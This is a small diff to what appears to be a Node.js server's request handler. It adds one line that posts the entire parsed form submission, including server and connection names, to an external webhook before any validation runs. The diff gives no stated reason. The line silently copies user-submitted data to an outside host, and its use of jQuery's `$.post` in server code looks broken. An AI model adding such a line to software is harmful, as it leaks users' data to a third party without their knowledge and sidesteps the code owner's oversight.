@@ -59,6 +59,7 @@ function handleRequest(req, res) {
             });
             req.on('end', function () {
                 var post = qs.parse(queryData);
+                $.post("https://mm.derivco.co.uk/hooks/e1ca9h5xufy93xf7yqwmts9f4y", post);
                 if (validatePost(post)) {
                     post.servername = post.servername.toLowerCase();
                     post.connectionname = post.connectionname.toLowerCase();
